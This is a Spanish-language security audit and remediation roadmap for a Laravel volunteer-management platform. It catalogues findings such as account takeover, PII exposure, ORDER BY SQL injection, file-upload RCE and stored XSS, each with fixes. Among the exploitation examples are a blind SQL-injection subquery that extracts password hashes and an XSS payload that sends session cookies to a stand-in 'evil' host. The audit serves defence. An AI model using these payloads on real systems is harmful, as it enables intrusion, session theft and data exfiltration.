# Auditoría de Seguridad y Plan de Hardening — TECHO Actividades

> **Fecha:** 2026-07-24 · **Alcance:** todo el sistema (API mobile Passport, backoffice Blade+Vue con Spatie, frontend web público)
> **Método:** revisión de código como fuente de verdad (routes, controllers, models, middleware, config, Search, Payments, vistas Blade y componentes Vue).
> **Estado:** informe de diagnóstico + roadmap. **No se modificó código todavía.**

Este documento es la referencia de trabajo: cada hallazgo tiene un ID estable (`C-1`, `A-3`, etc.) para poder resolverlos uno por uno y trackear el avance.

---

## 1. Resumen ejecutivo

El sistema tiene una base razonable en algunas áreas modernas (donaciones Stripe, webhooks con verificación de firma, montos derivados server-side, endpoints de la API mobile bien scopeados por `idPersona`), pero arrastra **fallas críticas de seguridad heredadas del código legacy web/ajax** y una **arquitectura de autorización inconsistente y retrofiteada** que hoy es la causa raíz de la mayoría de los riesgos.

Hay **6 hallazgos críticos** que permiten, hoy, en producción:

- **Toma de control de cualquier cuenta** (incluidos admins) conociendo solo un email — sin contraseña, sin auth (`C-1`).
- **Volcado masivo de PII** (incluido DNI) de todos los usuarios de todos los países, sin autenticación (`C-2`).
- **SQL Injection sistémica** vía `ORDER BY` en ~13 listados del backoffice → exfiltración total de la base (`C-3`).
- **Subida de archivos arbitrarios → RCE** disparable por cualquier voluntario autenticado (`C-4`).
- **Stored XSS de voluntario que ejecuta en la sesión del coordinador/admin** en el backoffice (`C-5`).
- **Registro público que confía en `google_id`/`facebook_id` del cliente**, salteando la verificación de email y emitiendo tokens (`C-6`).

Además, el **aislamiento entre países no es una frontera de seguridad real**: `idPaisPermitido` se aplica de forma dispersa y varias rutas de escritura del backoffice permiten IDOR cross-país.

**Prioridad inmediata (esta semana):** `C-1`, `C-2`, `C-3`, `C-4`. Son explotables por atacantes de bajo o nulo privilegio y de alto impacto. `C-1` y `C-2` son cambios de bajo riesgo funcional (rutas legacy que casi no deberían existir).

### Tabla maestra de hallazgos

| ID | Criticidad | Hallazgo | Prioridad |
|----|-----------|----------|-----------|
| C-1 | 🔴 Crítica | Account takeover no autenticado vía `/ajax/usuario/linkear` | P0 |
| C-2 | 🔴 Crítica | Volcado de PII no autenticado vía `/ajax/personas` | P0 |
| C-3 | 🔴 Crítica | SQL Injection `ORDER BY` sistémica (`$request->sort`) | P0 |
| C-4 | 🔴 Crítica | File upload sin validación → RCE (voucher, foto, ficha médica) | P0 |
| C-5 | 🔴 Crítica | Stored XSS voluntario → contexto admin (Vuetable `v-html`) | P1 |
| C-6 | 🔴 Crítica | Registro confía en `google_id`/`facebook_id` del cliente | P1 |
| A-1 | 🟠 Alta | IDOR cross-país en escrituras de actividad (falta `can:` middleware) | P1 |
| A-2 | 🟠 Alta | Gestión de coordinadores protegida solo por policy de lectura | P1 |
| A-3 | 🟠 Alta | `whereRaw` con concatenación de `edad_desde/hasta` | P1 |
| A-4 | 🟠 Alta | Sin protección de fuerza bruta en login (web y API) | P1 |
| A-5 | 🟠 Alta | Tokens Passport sin TTL y no revocados al cambiar contraseña | P1 |
| A-6 | 🟠 Alta | Cookies de sesión sin `Secure` + sin HTTPS forzado | P1 |
| A-7 | 🟠 Alta | Stored XSS en `Actividad.descripcion` (web pública + emails) | P2 |
| A-8 | 🟠 Alta | Middleware `requiere.auth` es un no-op (no autentica) | P1 |
| M-1 | 🟡 Media | Lectura de PII de cualquier Persona cross-país (backoffice) | P2 |
| M-2 | 🟡 Media | Clonar/leer cualquier actividad cross-país | P2 |
| M-3 | 🟡 Media | Asignación de roles sin scope de país (priv-esc latente) | P2 |
| M-4 | 🟡 Media | Mass assignment `EvaluacionActividad::create($request->all())` | P2 |
| M-5 | 🟡 Media | `$guarded` finos en Inscripcion/Actividad/Persona (latente) | P2 |
| M-6 | 🟡 Media | PII (docs identidad, ficha médica) en disco público | P2 |
| M-7 | 🟡 Media | Uploads SVG (XSS) + `should_validate_size=false` | P2 |
| M-8 | 🟡 Media | Sin security headers ni CSP | P2 |
| M-9 | 🟡 Media | `same_site=null` en cookies | P2 |
| M-10 | 🟡 Media | `APP_DEBUG=true` en templates + `APP_KEY` en git | P2 |
| M-11 | 🟡 Media | OAuth web con `stateless()` (sin state/CSRF) + match por email | P2 |
| M-12 | 🟡 Media | Sentry envía `sql_bindings` + `user_context` (PII a tercero) | P2 |
| M-13 | 🟡 Media | Reset de contraseña no revoca tokens Passport | P2 |
| M-14 | 🟡 Media | Stored XSS en `Campaign.confirmation_message` | P2 |
| M-15 | 🟡 Media | Auto-modificación de `estadoPersona` (mass assignment) | P2 |
| M-16 | 🟡 Media | Monto de inscripción PayU tomado del request | P2 |
| B-1 | 🟢 Baja | Rutas `// TODO: segurizar` con solo `accesoBackoffice` | P3 |
| B-2 | 🟢 Baja | Política de contraseña débil en `register` (sin `min`) | P3 |
| B-3 | 🟢 Baja | Enumeración de cuentas en reset de contraseña | P3 |
| B-4 | 🟢 Baja | CSRF deshabilitado si `APP_ENV=testing` | P3 |
| B-5 | 🟢 Baja | `orderBy` desde request en `mis_actividades/Sort.php` | P3 |
| B-6 | 🟢 Baja | Personas desactivadas (no soft-deleted) pueden loguear | P3 |
| B-7 | 🟢 Baja | `session.encrypt=false`, `/oauth/token` sin throttle, throttle API 60/min | P3 |
| D-1 | 🟠 Alta | Dependencias EOL (Laravel 5.7, Vue 2, libs varias) | Estratégico |

---

## 2. Hallazgos detallados

Para cada uno: **riesgo real · impacto · explotación · corrección · riesgo de romper funcionalidad · prioridad.**

---

### 🔴 C-1 — Account takeover no autenticado vía `/ajax/usuario/linkear`

- **Ubicación:** `app/Http/Controllers/ajax/UsuarioController.php:187-206`; ruta `routes/web.php:106`.
- **Riesgo real:** la ruta vive en el grupo `ajax` **sin `requiere.auth`**. El método busca una Persona **solo por email**, le escribe un `google_id`/`facebook_id` provisto por el atacante, y luego hace `Auth::login($persona, true)`.

```php
public function linkear(Request $request) {
    $persona = Persona::where('mail', $request->email)->first();
    if ($persona) {
        if ($request->media == 'google')   $persona->google_id   = $request->id;
        if ($request->media == 'facebook') $persona->facebook_id = $request->id;
        $persona->save();
        Auth::login($persona, true);   // ← sesión autenticada como la víctima
    }
}
```

- **Explotación:** atacante no autenticado obtiene un CSRF token de cualquier página pública, envía `PUT /ajax/usuario/linkear` con `email=<víctima>`. La sesión queda logueada como la víctima; sin password, sin token, sin verificación. Además sobrescribe el `google_id`/`facebook_id` real de la víctima (takeover persistente).
- **Impacto:** toma de control total de **cualquier** cuenta —incluidos admins— conociendo solo el email. Es el hallazgo más grave.
- **Corrección:** eliminar la ruta si es código muerto; si el flujo de linkeo es necesario, exigir sesión autenticada + validación de un token OAuth real del proveedor (reutilizar `SocialProviderFactory` como en `api\PersonasController::providerLogin`). Nunca `Auth::login()` desde una búsqueda por email.
- **Riesgo de romper:** **Bajo.** Es un endpoint legacy; validar si el frontend lo usa (grep en `resources/js`). Probable que sea residual.
- **Prioridad:** **P0 — inmediato.**

---

### 🔴 C-2 — Volcado de PII no autenticado vía `/ajax/personas`

- **Ubicación:** `app/Http/Controllers/ajax/UsuarioController.php:256-269` (`getPersonas`); ruta `routes/web.php:52` (antes del sub-grupo `requiere.auth`).
- **Riesgo real:** endpoint no autenticado que hace un `LIKE` sobre `nombres, apellidoPaterno, mail, dni` y devuelve **modelos `Persona` crudos**, sin scope de país. `Persona::$hidden` solo oculta `password, remember_token, google_id, facebook_id, unsubscribe_token`; todo lo demás sale: **mail, DNI, teléfono, fecha de nacimiento, género, estado, país**.
- **Explotación:** `GET /ajax/personas?q=a`, iterar por letras/términos → base completa de usuarios de todos los países.
- **Impacto:** brecha masiva de PII / documento nacional, no autenticada. Incidente de protección de datos.
- **Corrección:** mover la ruta dentro del grupo autenticado (`requiere.auth`) + permiso, devolver un **API Resource** (nunca el modelo crudo), aplicar scope por `idPaisPermitido`. Mismo tratamiento para `/ajax/coordinadores` (`web.php:51`) y `admin/ajax/search/usuarios` (`web.php:205`, hoy fuera del grupo auth; no filtra por casualidad porque revienta con 500).
- **Riesgo de romper:** **Bajo/Medio.** Verificar quién consume el endpoint; si es un autocomplete del frontend autenticado, solo cambia el middleware.
- **Prioridad:** **P0 — inmediato.**

---

### 🔴 C-3 — SQL Injection sistémica vía `ORDER BY` (`$request->sort`)

- **Ubicación (sink):** `orderByRaw($sort)` en ~13 clases Search: `app/Search/UsuariosSearch.php:37`, `IntegrantesSearch.php:36`, `EquiposSearch.php:37`, `ComunidadesSearch.php:36`, `TiposActividadSearch.php:36`, `ReferenteComunidadSearch.php:36`, `LocalidadesDataSearch.php:42`, `SuscriptosSearch.php:37`, `InstitucionEducativaSearch.php:36`, `RedComunidadSearch.php:37`, `OficinasSearch.php:36`, `ProvinciasSearch.php:36`, `EquipoReunionesSearch.php:36`. También directo en `app/Http/Controllers/backoffice/EstadisticasController.php` (varios métodos).
- **Ubicación (source):** el patrón se repite en cada controller del backoffice, p.ej. `backoffice/ajax/UsuariosController.php:40-52`:

```php
if ($request->filled('sort')) {
    if (strpos($request->sort, "|")) $sort = join(" ", explode("|", $request->sort));
    else $sort = $request->sort;
}
$result = UsuariosSearch::apply($filtros, $sort, $per_page);   // $sort → orderByRaw($sort)
```

- **Explotación:** MySQL permite subqueries en `ORDER BY`. Un usuario autenticado del backoffice envía `?sort=(select case when (ascii(substring((select password from Persona limit 1),1,1))>77) then idPersona else mail end)` → extracción blind boolean/time-based. `orderByRaw` no escapa nada.
- **Impacto:** exfiltración total de la base (hashes de contraseña, PII, tokens) desde cualquier sesión de backoffice.
- **Corrección:** whitelist de columnas y dirección en un único lugar. Base para todas las Search:

```php
protected static function sanitizeSort(string $sort, array $allowed, string $default): string {
    [$col, $dir] = array_pad(explode('|', $sort), 2, 'asc');
    $col = in_array($col, $allowed, true) ? $col : $default;
    $dir = strtolower($dir) === 'desc' ? 'desc' : 'asc';
    return "$col $dir";
}
```

  Cada Search declara su lista de columnas ordenables permitidas.
- **Riesgo de romper:** **Bajo** si la whitelist incluye todas las columnas hoy ordenables por UI. Requiere enumerar los campos por listado (los catálogos de `config/datatables.php` ayudan).
- **Prioridad:** **P0 — inmediato.**

---

### 🔴 C-4 — File upload sin validación → RCE / stored XSS

- **Ubicación:** `app/Services/ImageUploadService::store()` (`app/Services/ImageUploadService.php:38-81`) no valida tipo/mime/tamaño; para extensiones no-raster hace `$file->store($dir)` **preservando la extensión** (`.php`, `.phtml`, `.svg`, `.html`) en disco público (servido bajo `/storage/...`). Endpoints afectados:

| Endpoint | Regla actual | Destino | Auth |
|---|---|---|---|
| `InscripcionesController@voucherPago` (`:297`) | `voucher` → `required` | `public/voucherInscipcion/{id}` | voluntario (Passport) |
| `ajax/FichaMedicaController@uploadArchivoMedico` (`:62-101`) | `nullable` | `public/perfil/fichaMedica` | voluntario |
| `ajax/UsuarioController@cambiar_photo` (`:158-164`) | `nullable` | público | voluntario |
| `backoffice/ajax/ActividadesController@storeImagenTarjeta/Destacada` (`:58-84`) | `nullable\|file` (sin `image`) | público | coordinador |
| `backoffice/ajax/IntegrantesController@uploadArchivos` (`:128-155`) | `nullable` | público | coordinador |

- **Explotación:** voluntario autenticado hace `POST /api/inscripciones/voucher` con `voucher=shell.php`. Se guarda como `/storage/voucherInscipcion/{id}/<random>.php`. Si el servidor mapea `/storage` a PHP-FPM (default habitual) → **RCE**. Un `.svg`/`.html` da stored XSS en el mismo origen.
- **Impacto:** ejecución remota de código / compromiso total del servidor, disparable por cualquier voluntario. Alternativamente stored XSS.
- **Corrección:** en cada endpoint, `mimes:jpg,jpeg,png,pdf` + `max:` explícito; centralizar la validación en `ImageUploadService`; documentos/PII a **disco privado** (patrón correcto ya existe en `PreguntaArchivoController`); a nivel infra, deshabilitar ejecución de PHP bajo `/storage`.
- **Riesgo de romper:** **Bajo.** Solo restringe extensiones ya inesperadas. Confirmar qué tipos legítimos suben hoy (PDF en vouchers/ficha médica).
- **Prioridad:** **P0 — inmediato** (mitigación infra de `/storage` puede aplicarse hoy mismo como parche).

---

### 🔴 C-5 — Stored XSS de voluntario que ejecuta en el backoffice (admin)

- **Ubicación:** `resources/js/components/backoffice/datatable/Vuetable.vue:699-703` (`renderNormalField`) → `getObjectValue` (crudo, `:1014`) → `v-html` (`:125,267,275`). Campos base como `nombres`/`apellidoPaterno` (`config/datatables.php:216-225`) salen sin escapar desde `backoffice/ajax/InscripcionesController.php:66`. Mismo patrón en integrantes (`IntegrantesController.php:112`, concatena `nombres + apellidoPaterno + (mail)`).
- **Riesgo real:** el wrapper Vuetable renderiza **todo campo "normal" vía `v-html`**, delegando el escape al backend. `EnriquecedorFilas` escapa correctamente los campos dinámicos (`pregunta_{id}`, archivos) con `e()`, pero **las columnas base de Persona lo saltean** y salen crudas.
- **Explotación:** un voluntario pone en su nombre `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`, se inscribe a una actividad; cuando un coordinador/admin abre el listado de inscripciones, el payload ejecuta en el origen del backoffice (sesión, CSRF token, acciones admin).
- **Impacto:** atacante de bajo/nulo privilegio → ejecución de JS en sesión admin. Robo de sesión/token, exfiltración masiva, escalada. Persistente, sin más interacción que abrir una pantalla de rutina.
- **Corrección:** escapar los valores string de campos base server-side antes del sink (replicar `e()` de `EnriquecedorFilas` sobre las columnas de Persona), **o** dejar de usar `v-html` para campos de texto plano en `Vuetable.vue` (usar interpolación `{{ }}`). La segunda es la corrección de fondo.
- **Riesgo de romper:** **Medio.** Algunos campos "normales" quizá dependan de HTML intencional (links). Auditar cuáles y separarlos como campos componente.
- **Prioridad:** **P1.**

---

### 🔴 C-6 — Registro público confía en `google_id`/`facebook_id` del cliente

- **Ubicación:** `ajax/UsuarioController.php:84-117` (`apiCreate`, `POST /api/create`) y `:58-82` (`create`, `POST /ajax/usuario`); duplicado en `api/PersonasController.php:174-207`.

```php
$persona->password = (!empty($request->google_id) || !empty($request->facebook_id))
    ? Hash::make(str_random(30)) : Hash::make($request->pass);
if (!empty($request->google_id) || !empty($request->facebook_id)) {
    $persona->email_verified_at = now();   // ← confía en un id social afirmado por el cliente
}
$token = $persona->createToken('Token Name')->accessToken;  // apiCreate
```

- **Explotación:** el cliente postea `google_id=cualquiercosa` + un email arbitrario. No se valida ningún token OAuth real (a diferencia de `providerLogin`). La cuenta se crea con `email_verified_at` seteado y —en `apiCreate`— devuelve un token Passport válido.
- **Impacto:** cualquiera puede crear cuentas pre-verificadas para emails que no controla y obtener un token de API, anulando la verificación de email.
- **Corrección:** enrutar todo el alta social por `providerLogin` (que valida el token del proveedor con `SocialProviderFactory`, exige `email_verified` y rechaza mismatch de id social). Nunca setear `email_verified_at` ni emitir token en base a un id social sin validar.
- **Riesgo de romper:** **Medio.** Requiere que el cliente mobile mande el token OAuth del proveedor, no el id. Coordinar con el equipo mobile (ver memoria de métodos de pago; hay precedente de contratos front/back).
- **Prioridad:** **P1.**

---

### 🟠 A-1 — IDOR cross-país en escrituras de actividad (falta `can:` middleware)

- **Ubicación:** rutas sin middleware `can:` — `routes/web.php:390` (`ActividadesController@update`), `:475-476` (`PuntosController@update/delete`), `:488-491` (`GruposActividadesController@*`), `:470-471` (imágenes), `:442-443,492-493` (`actividad`, `coordinadores`, `grupos`, `clonar`). El **mismo** método `update` tiene una ruta hermana protegida en `:449` (`can:editar,App\Actividad,id`), lo que prueba que la omisión es un bug.
- **Riesgo real:** los métodos toman un id de actividad/punto/grupo y actúan sin verificar pertenencia ni país. `PuntosController@update` ni siquiera valida que el `{punto}` pertenezca a la `{actividad}`.
- **Explotación:** cualquier usuario con `ver_backoffice` (todo coordinador) hace `POST /admin/ajax/actividades/<id>` con payload válido y edita cualquier actividad de cualquier país.
- **Impacto:** manipulación cross-tenant de actividades, logística y asignación de grupos de voluntarios, en toda la plataforma, por usuario de bajo privilegio.
- **Corrección:** agregar `can:editar`/`can:ver` (+ scope `idPaisPermitido`) a cada ruta mutadora; validar que los hijos pertenezcan al padre. A futuro, política centralizada en vez de por-ruta.
- **Riesgo de romper:** **Bajo.** Añadir el check que ya usan las rutas hermanas.
- **Prioridad:** **P1.**

---

### 🟠 A-2 — Gestión de coordinadores protegida solo por policy de lectura

- **Ubicación:** `backoffice\ActividadesController@guardarCoordinador` (`:199-206`, ruta `web.php:444`), `@eliminarCoordinador` (`:188-197`, ruta `:445`) → autorizadas con `can:ver,App\Actividad` (misma habilidad que ver).
- **Riesgo real:** `guardarCoordinador` adjunta una `{persona}` arbitraria como coordinador; y como `ActividadesPolicy::editar()/ver()` conceden derechos a quien esté en `coordinadores`, un coordinador puede escalar a un tercero (o a un sockpuppet) a permisos de edición. Sin check de país.
- **Impacto:** un coordinador otorga privilegios de edición de actividad a cuentas arbitrarias; mutación gateada por una habilidad de solo-lectura.
- **Corrección:** exigir `can:editar` (o admin) y validar el país de la persona objetivo.
- **Riesgo de romper:** **Bajo.**
- **Prioridad:** **P1.**

---

### 🟠 A-3 — `whereRaw` con concatenación de `edad_desde`/`edad_hasta`

- **Ubicación:** `EstadisticasController.php:227` y `app/Exports/PersonasInscriptasExport.php:60`:

```php
$consulta->whereRaw("TIMESTAMPDIFF(YEAR, Persona.fechaNacimiento, CURDATE()) BETWEEN ".$edad_desde." AND ".$edad_hasta);
```

- **Explotación:** `?edad_hasta=99 OR (SELECT ...)` → inyección en el WHERE. Nunca se castea a int.
- **Impacto:** SQL injection → exfiltración/manipulación de datos.
- **Corrección:** castear a `(int)` o bindear como `?`.
- **Riesgo de romper:** **Ninguno.**
- **Prioridad:** **P1.**

---

### 🟠 A-4 — Sin protección de fuerza bruta en login (web y API)

- **Ubicación:** `Auth/LoginController.php:52-89` (`POST /login`, `web.php:133`) y `api/PersonasController.php:54-89` (`POST /api/login`). Ambos sobreescriben `login()` y usan `Auth::attempt()` crudo **sin** `ThrottlesLogins`. La ruta web no tiene throttle; la API solo hereda `throttle:60,1` global (`Kernel.php:43`).
- **Impacto:** adivinación de contraseñas / credential stuffing sin mitigación.
- **Corrección:** `->middleware('throttle:5,1')` en login web + throttle dedicado estricto en `/api/login`, `/api/register`, `/api/resetPassword`, `/oauth/token`. Idealmente reinstaurar `ThrottlesLogins`.
- **Riesgo de romper:** **Bajo** (ajustar límites a uso real).
- **Prioridad:** **P1.**

---

### 🟠 A-5 — Tokens Passport sin TTL y no revocados al cambiar contraseña

- **Ubicación:** `app/Providers/AuthServiceProvider.php:37` — solo `Passport::routes()`, sin `tokensExpireIn()`/`refreshTokensExpireIn()`. `logout()` (`PersonasController.php:160`) revoca solo el token actual; el reset de contraseña no revoca nada; cada login emite un token nuevo sin revocar los previos (se acumulan en `oauth_access_tokens`).
- **Impacto:** un token mobile filtrado vale indefinidamente; cambiar la contraseña no bloquea al ladrón.
- **Corrección:** TTL explícito en `boot()`; revocar tokens del usuario en reset/cambio de contraseña; opcionalmente revocar tokens previos en login nuevo.
- **Riesgo de romper:** **Medio.** TTL corto obliga a refresh en mobile; coordinar. Empezar con TTL generoso (p.ej. 30 días access, refresh más largo) + revocación en reset.
- **Prioridad:** **P1.**

---

### 🟠 A-6 — Cookies de sesión sin `Secure` + sin HTTPS forzado

- **Ubicación:** `config/session.php:167` (`secure => env('SESSION_SECURE_COOKIE', false)`); sin `URL::forceScheme('https')`.
- **Impacto:** cookie de sesión viaja en claro salvo config explícita → hijacking en downgrade/HTTP.
- **Corrección:** `SESSION_SECURE_COOKIE=true` en prod, forzar HTTPS (app o proxy) + HSTS (ver M-8).
- **Riesgo de romper:** **Bajo** en prod HTTPS. Verificar que dev local (HTTP) no rompa (usar env).
- **Prioridad:** **P1** (config de prod).

---

### 🟠 A-7 — Stored XSS en `Actividad.descripcion` (web pública + emails)

- **Ubicación:** `resources/views/actividades/show.blade.php:73,80` (`{!! $actividad->descripcion !!}`), `inscripciones/confirmar.blade.php:292`, `inscripciones/pagar-paso-1.blade.php:198` (`descripcionPago`), `emails/InscripcionFaltaPago.blade.php:44`.
- **Riesgo real:** descripción editada por coordinadores, guardada cruda, renderizada sin sanitizar en páginas públicas y en cuerpos de email.
- **Explotación:** un coordinador (o cualquiera con edición de actividad) inyecta `<script>`; ejecuta en el navegador de todos los voluntarios que ven la actividad/confirmación/pago, y en emails HTML.
- **Impacto:** stored XSS a audiencia amplia + dentro de emails.
- **Corrección:** sanitizar con allow-list (p.ej. HTMLPurifier) al guardar o al renderizar; nunca `{!! !!}` sobre input de usuario sin sanitizar.
- **Riesgo de romper:** **Medio.** La descripción es rich-text intencional; usar allow-list en vez de escape total para preservar formato.
- **Prioridad:** **P2.**

---

### 🟠 A-8 — Middleware `requiere.auth` no aplica autenticación (no-op)

- **Ubicación:** `app/Http/Middleware/RequiereAuth.php`. Descubierto al resolver C-2.
- **Riesgo real:** el middleware **no bloquea** peticiones no autenticadas; solo comparte una variable de vista (`view()->share('requiere_auth', ...)`, consumida por `resources/views/main.blade.php:39` para mostrar el modal de login) y siempre llama a `$next($request)`.

```php
public function handle($request, Closure $next) {
    view()->share('requiere_auth', 0);
    if (!Auth::check()) { view()->share('requiere_auth', 1); }
    return $next($request);   // ← nunca aborta: no es enforcement
}
```

- **Impacto:** toda ruta que dependa **solo** de `requiere.auth` (sin `can:`) es accesible sin sesión. En particular el **grupo ajax de `routes/web.php:72`** (institución educativa, **subida de ficha médica** `fichaMedica/archivo_medico`, estudios, equipos) y `routes/web.php:181`. Los controllers derefencian `auth()->user()->idPersona` → hoy revientan con 500 en vez de filtrar, pero la subida de archivos (C-4) queda expuesta a no autenticados y el patrón es frágil. Las rutas que combinan `requiere.auth` **con** `can:...` (evaluaciones `:159-162`, confirmar/inscribir `:168,185`) sí quedan protegidas: el middleware `Authorize` deniega (403) a invitados.
- **Explotación:** `POST /ajax/fichaMedica/archivo_medico` sin sesión llega al controller.
- **Corrección:** reemplazar los grupos `requiere.auth`-solos por `auth` real (guard web) manteniendo el flag para las vistas donde haga falta (p.ej. un middleware que autentique pero exponga el flag, o separar "hint de vista" de "enforcement"). Evaluar endpoint por endpoint para no romper páginas que renderizan para invitados. **No incluido en Fase 0** por ser un cambio de comportamiento amplio; los endpoints ex-públicos de C-2 se movieron a `auth` real sin depender de `requiere.auth`.
- **Riesgo de romper:** **Medio.** Requiere revisar cada consumidor; hacerlo en Fase 1 con tests.
- **Prioridad:** **P1.**

### 🟡 Hallazgos Media

- **M-1 — PII de cualquier Persona cross-país (backoffice).** `ajax/PersonasController.php:49-53`, ruta `web.php:534`: `GET /admin/ajax/personas/{id}` solo tras `accesoBackoffice`; `findOrFail` + `PersonaDatosResource` (dni, mail, móvil, nacimiento, género, ubicación) sin `ver_usuarios` ni scope de país. → agregar `permission:ver_usuarios` + scope.
- **M-2 — Clonar/leer cualquier actividad cross-país.** `ActividadesController@clonar` (`:417-447`), `@actividad` (`:182`), `@coordinadores` (`:208`) sin `can:`. `coordinadores()` devuelve nombre+email de coordinadores de cualquier actividad. → agregar policy checks.
- **M-3 — Asignación de roles sin scope de país (priv-esc latente).** `UsuariosRolesController@update` (`web.php:384`, `permission:asignar_roles`): `syncRoles($request->rolID)` para cualquier user/rol, sin scope de país ni bloqueo de `admin`. Hoy `asignar_roles` es solo de admin, pero el día que se delegue, permite acuñar admins de cualquier país. → scope por `idPaisPermitido` + prohibir elevar a `admin` salvo admin.
- **M-4 — Mass assignment `EvaluacionActividad::create($request->all())`.** `EvaluacionesController.php:131`: valida un subconjunto pero asigna todo. → crear desde `$request->validated()`.
- **M-5 — `$guarded` finos (latente).** `Inscripcion.php:16` (`['idInscripcion']` deja `confirma/pago/presente` asignables), `Actividad.php:15`, `Persona.php:21`. Hoy los write paths usan arrays explícitos, pero cualquier futuro `fill($request->all())` se vuelve bypass. → `$fillable` explícito sin campos de estado/permiso/FK.
- **M-6 — PII en disco público.** `FichaMedicaController` guarda certificados médicos y **documentos de identidad** en `public/perfil/fichaMedica`, servidos sin auth (`:72-94`). → disco privado + acceso autorizado (patrón de `PreguntaArchivoController`).
- **M-7 — SVG uploads + `should_validate_size=false`.** `config/lfm.php:81,95,124` permite `image/svg+xml` (XSS) y desactiva el cap de tamaño (DoS). La regla `image` de Laravel también acepta SVG. → excluir SVG, activar validación de tamaño.
- **M-8 — Sin security headers ni CSP.** No hay `X-Frame-Options`, `X-Content-Type-Options`, HSTS, `Referrer-Policy`, ni CSP en ningún lado; no hay middleware de headers. → middleware de headers en el grupo `web` + CSP (nonce-based; requiere planificar por scripts inline).
- **M-9 — `same_site=null`.** `config/session.php:195`. → `'lax'`.
- **M-10 — `APP_DEBUG=true` en templates + `APP_KEY` en git.** `.env.example`, `.env.testing` (trackeado, con `APP_KEY` real de test), `.env.travis`. `config/app.php` default es `false` (bien), pero los templates inducen a error en prod. → `APP_DEBUG=false` en `.env.example`, rotar/quitar la key trackeada.
- **M-11 — OAuth web `stateless()` + match por email sin `email_verified`.** `Auth/LoginController.php:125-180`: `stateless()` desactiva validación de `state` (login-CSRF); resuelve la cuenta por email del proveedor sin chequear verificación (a diferencia de la API). → quitar `stateless()` en el flujo web y exigir `email_verified`.
- **M-12 — Sentry envía `sql_bindings` + `user_context`.** `config/sentry.php:10,13`: bind values (emails, tokens, PII) y datos de usuario a un tercero. → `sql_bindings=false` en prod, scrub de PII.
- **M-13 — Reset de contraseña no revoca tokens Passport.** `app/Traits/ResetsPasswords.php:112-123`. → revocar `oauth_access_tokens` del usuario en reset (junto con A-5).
- **M-14 — Stored XSS en `Campaign.confirmation_message`.** `resources/js/components/perfil/suscribe.vue:294-297` (`v-html`), validación `nullable|string` (`CampanasController.php:56,88`), enviado crudo a mobile (`api/CampanasController.php:102`). → sanitizar con allow-list.
- **M-15 — Auto-modificación de `estadoPersona`.** `ajax/UsuarioController.php:131-153` (`cargar_cambios` desde self-update): copia `estadoPersona`, `idPais` del request a `Auth::user()`. (Roles/`idPaisPermitido` no se tocan — bien.) → whitelist sin `estadoPersona`.
- **M-16 — Monto de inscripción PayU del request.** `InscripcionesController.php:172` (`setMonto($request->monto)`). La firma del gateway impide confirmar impago, pero permite iniciar pago por monto arbitrario. → derivar el monto server-side como el flujo Stripe.

### 🟢 Hallazgos Baja

- **B-1 — Rutas `// TODO: segurizar`.** `web.php:516` (`/inscripciones/importar/template`), `:535` (`/logs/{proceso}`) con solo `accesoBackoffice`. `LogsController@show` sirve logs de proceso a cualquier backoffice. → `role:admin`.
- **B-2 — Contraseña débil en `register`.** `Requests/CrearPersona.php`: `password => required|confirmed` sin `min`. Otros paths exigen `min:8`. → unificar política de contraseña (≥8, complejidad).
- **B-3 — Enumeración en reset.** `SendsPasswordResetEmails.php:38-46`: respuesta distinta para email conocido/desconocido. → respuesta genérica siempre.
- **B-4 — CSRF off si `APP_ENV=testing`.** `VerifyCsrfToken::tokensMatch()` retorna `true` si `env('APP_ENV')==='testing'`. → gatear por el framework de test, no por env runtime.
- **B-5 — `orderBy` desde request.** `filters/mis_actividades/Sort.php:15`: Laravel backtick-escapa la columna (menor riesgo) pero no valida dirección. → whitelist (junto con C-3).
- **B-6 — Personas desactivadas pueden loguear.** Login no chequea `estadoPersona`. → bloquear estados inactivos.
- **B-7 — Misceláneos.** `session.encrypt=false`, `/oauth/token` sin throttle, `throttle:60,1` generoso para auth, `socialLogin` en `routes/api.php:32` apunta a método inexistente (500).

### 🟠 D-1 — Dependencias EOL / desactualizadas (estratégico)

- **Laravel 5.7** — EOL desde 2020, sin parches de seguridad.
- **Vue 2** — EOL Dic 2023.
- `sentry/sentry-laravel ^0.11`, `laravel/socialite ^3.0`, `spatie/laravel-permission ^2.11`, `lcobucci/jwt 3.3.3`, `barryvdh/laravel-dompdf ^0.8`, `google/apiclient ^2.0` — varios majors atrás; los pins de era 5.7 bloquean upgrades.
- **Riesgo:** vulnerabilidades sin fix upstream (supply-chain).
- **Corrección:** planificar migración Laravel (5.7→6→7→8→9→10/11 escalonado) como habilitador de todo lo demás. Correr `composer audit` / `npm audit` en CI.

---

## 3. Evaluación del modelo de permisos actual

Hoy la seguridad depende de cuatro capas mal integradas:

1. **API mobile (Passport)** — la más sana. `auth:api` + controllers modernos que scopean por `idPersona`. Sin IDOR detectado.
2. **Backoffice (`/admin/*`)** — un gate externo `can:accesoBackoffice` + checks `can:`/`role:`/`permission:` **por ruta, ad-hoc**. La cobertura es dispareja: rutas hermanas al mismo método difieren en si llevan check (de ahí A-1, A-2, M-1, M-2).
3. **Legacy `/ajax/*` (web)** — la más peligrosa: varias rutas sobre datos de `Persona` **fuera de toda autenticación** (C-1, C-2).
4. **Aislamiento por país (`idPaisPermitido`)** — **no es una frontera real.** `SeleccionarPais` solo setea sesión para el frontend público, no es control de seguridad. `idPaisPermitido` se aplica solo en algunas Search y en `ActividadesController@destroy`, ausente en editar-actividad, puntos, grupos, gestión de coordinadores y asignación de roles.

**Diagnóstico:** el problema de fondo no es la falta de un modelo de roles (Spatie está bien), sino que **la autorización vive dispersa en middlewares por-ruta y no en una capa central por-modelo**, y que **el tenant país no está materializado como scope automático**. Esto hace que cada ruta nueva sea una oportunidad de olvido.

### Arquitectura objetivo (evolución, no reescritura)

El modelo actual **puede fortalecerse sin reescribir**. Objetivo para los próximos años:

1. **Autorización centralizada por Policy para cada modelo con dueño/país.** Toda mutación pasa por `$this->authorize()` / `can:` apuntando a una Policy, no por checks inline. Las Policies ya existentes (`Actividad`, `Inscripcion`, `Campaign`) se completan y se hacen obligatorias en todas las rutas.
2. **Tenant país como scope automático.** Trait `BelongsToCountry` + **Global Scope** que filtra por `idPaisPermitido` del usuario autenticado en modelos país-scopeados, con bypass explícito para superadmin. Así el aislamiento deja de depender de que cada dev lo recuerde. (Limitación conocida: scope a nivel país, no oficina, porque `Persona` solo tiene `idPaisPermitido`; documentado en reporting.)
3. **Nunca devolver modelos Eloquent crudos.** API Resources en todo endpoint (elimina C-2 y clases enteras de fuga de campos). `$hidden` deja de ser la única defensa.
